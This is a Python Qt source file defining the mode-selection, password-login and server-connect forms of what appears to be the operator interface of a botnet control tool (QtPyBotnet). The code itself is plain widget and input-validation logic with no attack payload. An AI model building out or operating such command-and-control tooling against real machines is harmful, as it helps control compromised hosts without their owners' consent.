from qtpy.QtWidgets import (QWidget, QVBoxLayout, QLabel, QPushButton, QLineEdit, QFormLayout, QComboBox, QSpinBox,
                            QDialogButtonBox)
from qtpy.QtCore import (Signal, Qt, QSize, QMetaObject, Slot)

import qrainbowstyle
import qrainbowstyle.widgets
import qrainbowstyle.windows

import ipaddress

from QtPyBotnet.view.BaseWidgets import BaseFrame


class ModeFrame(BaseFrame):

    def __init__(self, parent=None):
        super(ModeFrame, self).__init__(parent)
        self.setObjectName("botnet_mode_frame")

        self.mode_layout = QVBoxLayout(self)
        self.mode_layout.setObjectName("mode_layout")
        self.setLayout(self.mode_layout)

        self.mode_widget = QWidget(self)
        self.mode_widget_layout = QFormLayout(self.mode_widget)
        self.mode_widget_layout.setContentsMargins(0, 0, 0, 0)
        self.mode_widget_layout.setObjectName("mode_widget_layout")
        self.mode_widget.setLayout(self.mode_widget_layout)
        self.mode_layout.addWidget(self.mode_widget)

        self.mode_label = QLabel(self.mode_widget)
        self.mode_label.setObjectName("mode_label")
        self.mode_label.setText("Mode")
        self.mode_widget_layout.setWidget(0, QFormLayout.LabelRole, self.mode_label)

        self.mode_combo = QComboBox(self.mode_widget)
        self.mode_combo.setObjectName("mode_combo")
        self.mode_combo.addItems(["Server+GUI", "Remote", "Server", "Relay"])
        self.mode_widget_layout.setWidget(0, QFormLayout.FieldRole, self.mode_combo)

        self.start_button = QPushButton(self)
        self.start_button.setMinimumSize(QSize(0, 35))
        self.start_button.setObjectName("start_button")
        self.start_button.setText("START")
        self.mode_layout.addWidget(self.start_button)


class LoginFrame(BaseFrame):
    login_clicked = Signal(str)

    def __init__(self, parent=None):
        super(LoginFrame, self).__init__(parent)
        self.setObjectName("botnet_login_frame")

        self.login_layout = QVBoxLayout(self)
        self.login_layout.setObjectName("login_layout")
        self.setLayout(self.login_layout)

        self.pass_widget = QWidget(self)
        self.pass_widget_layout = QFormLayout(self.pass_widget)
        self.pass_widget_layout.setContentsMargins(0, 0, 0, 0)
        self.pass_widget_layout.setObjectName("pass_widget_layout")

        self.password_line_edit = QLineEdit(self.pass_widget)
        self.password_line_edit.setObjectName("password_line_edit")
        self.pass_widget_layout.setWidget(0, QFormLayout.FieldRole, self.password_line_edit)

        self.password_label = QLabel(self.pass_widget)
        self.password_label.setObjectName("password_label")
        self.password_label.setText("Password")
        self.pass_widget_layout.setWidget(0, QFormLayout.LabelRole, self.password_label)

        self.login_layout.addWidget(self.pass_widget)

        self.login_button = QPushButton(self)
        self.login_button.setMinimumSize(QSize(0, 35))
        self.login_button.setObjectName("login_button")
        self.login_button.setText("Sign in")
        self.login_layout.addWidget(self.login_button)
        QMetaObject.connectSlotsByName(self)

    @Slot()
    def on_login_button_clicked(self):
        password = self.password_line_edit.text()
        if password == "":
            self.warning = qrainbowstyle.windows.FramelessWarningMessageBox(self)
            self.warning.setStandardButtons(QDialogButtonBox.Ok)
            self.warning.button(QDialogButtonBox.Ok).clicked.connect(self.warning.close)
            self.warning.setText("All values are required!")
            self.warning.setWindowModality(Qt.WindowModal)
            self.warning.show()
            return
        else:
            self.login_clicked.emit(password)


class ConnectFrame(BaseFrame):
    connect_clicked = Signal(str, int, str)

    def __init__(self, parent=None):
        super(ConnectFrame, self).__init__(parent)
        self.setObjectName("botnet_connect_frame")

        self.connect_layout = QVBoxLayout(self)
        self.connect_layout.setObjectName("connect_layout")
        self.setLayout(self.connect_layout)

        self.pass_widget = QWidget(self)
        self.pass_widget_layout = QFormLayout(self.pass_widget)
        self.pass_widget_layout.setContentsMargins(0, 0, 0, 0)
        self.pass_widget_layout.setObjectName("pass_widget_layout")

        self.ip_label = QLabel(self.pass_widget)
        self.ip_label.setObjectName("username_label")
        self.ip_label.setText("IP Address")
        self.pass_widget_layout.setWidget(0, QFormLayout.LabelRole, self.ip_label)

        self.ip_line_edit = QLineEdit(self.pass_widget)
        self.ip_line_edit.setObjectName("ip_line_edit")
        self.pass_widget_layout.setWidget(0, QFormLayout.FieldRole, self.ip_line_edit)

        self.port_label = QLabel(self.pass_widget)
        self.port_label.setObjectName("username_label")
        self.port_label.setText("Port")
        self.pass_widget_layout.setWidget(1, QFormLayout.LabelRole, self.port_label)

        self.port_edit = QSpinBox(self.pass_widget)
        self.port_edit.setObjectName("username_line_edit")
        self.port_edit.setRange(1024, 65535)
        self.pass_widget_layout.setWidget(1, QFormLayout.FieldRole, self.port_edit)

        self.key_label = QLabel(self.pass_widget)
        self.key_label.setObjectName("key_label")
        self.key_label.setText("Key")
        self.pass_widget_layout.setWidget(2, QFormLayout.LabelRole, self.key_label)

        self.key_line_edit = QLineEdit(self.pass_widget)
        self.key_line_edit.setObjectName("key_line_edit")
        self.pass_widget_layout.setWidget(2, QFormLayout.FieldRole, self.key_line_edit)

        self.connect_layout.addWidget(self.pass_widget)

        self.connect_button = QPushButton(self)
        self.connect_button.setMinimumSize(QSize(0, 35))
        self.connect_button.setObjectName("connect_button")
        self.connect_button.setText("Connect")
        self.connect_layout.addWidget(self.connect_button)

        self.ip_line_edit.setText("127.0.0.1")
        self.port_edit.setValue(8000)
        self.key_line_edit.setText("")

        # show when needed widgets
        self.warning = qrainbowstyle.windows.FramelessWarningMessageBox(self)
        self.warning.setStandardButtons(QDialogButtonBox.Ok)
        self.warning.button(QDialogButtonBox.Ok).clicked.connect(self.warning.close)
        self.warning.setWindowModality(Qt.WindowModal)

        self.spinner = qrainbowstyle.widgets.WaitingSpinner(self, parent,
                                                            roundness=70.0, fade=70.0, radius=15.0, lines=6,
                                                            line_length=25.0, line_width=4.0, speed=1.0,
                                                            disableParentWhenSpinning=True, modality=Qt.WindowModal)
        QMetaObject.connectSlotsByName(self)

    @Slot()
    def on_connect_button_clicked(self):
        ip = self.ip_line_edit.text()
        port = int(self.port_edit.text())
        key = self.key_line_edit.text()

        if ip == "" or port == "" or key == "":
            self.warning.setText("All values are required!")
            self.warning.show()
            return

        try:
            ipaddress.ip_address(ip)
        except ValueError:
            self.warning.setText("IP address in not valid!")
            self.warning.show()
            return

        if port not in range(1024, 65536):
            self.warning.setText("Port must be in range 1024-65535! Provided {}!".format(port))
            self.warning.show()
            return

        self.spinner.start()
        self.connect_clicked.emit(ip, port, key)

    @Slot()
    def on_successfull_connection(self):
        self.spinner.stop()

    @Slot(str)
    def on_failed_connection(self, message: str = "Failed to connect to host."):
        self.spinner.stop()
        self.warning.setText(message)
        self.warning.show()
